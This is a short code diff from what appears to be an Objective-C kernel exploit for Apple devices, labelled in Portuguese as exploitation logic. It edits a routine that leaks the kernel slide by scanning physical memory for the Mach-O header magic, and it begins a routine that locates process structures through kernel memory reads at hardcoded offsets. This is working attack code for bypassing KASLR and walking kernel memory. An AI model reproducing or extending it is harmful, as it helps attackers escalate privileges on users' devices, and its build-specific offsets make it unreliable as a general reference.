@@ -82,12 +82,17 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 // --- LÓGICA DE EXPLORAÇÃO ---
 
 - (uint64_t)leakKernelSlide {
+    uint64_t search_base = 0xFFFFFFF007004000ULL;
     for (int i=0; i<0x400; i++) {
-        uint64_t addr = 0xFFFFFFF007004000ULL + (i * 0x200000ULL) + 0x4000;
+        uint64_t addr = search_base + (i * 0x200000ULL) + 0x4000;
+        // Primeira leitura descarta (limpa cache)
+        [self physRead64:addr]; 
+        // Segunda leitura real
         if ([self physRead64:addr] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
     }
-    return 0x0; 
+    return 0;
 }
+
 
 - (uint64_t)findProc:(pid_t)p {
     uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)];
